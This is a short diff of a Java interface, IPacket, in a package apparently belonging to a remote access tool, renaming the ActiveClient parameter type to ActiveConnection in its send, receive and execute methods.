@@ -1,15 +1,15 @@
 package de.sogomn.rat.packet;
 
-import de.sogomn.rat.ActiveClient;
+import de.sogomn.rat.ActiveConnection;
 
 
 
 public interface IPacket {
 	
-	void send(final ActiveClient client);
+	void send(final ActiveConnection client);
 	
-	void receive(final ActiveClient client);
+	void receive(final ActiveConnection client);
 	
-	void execute(final ActiveClient client);
+	void execute(final ActiveConnection client);
 	
 }
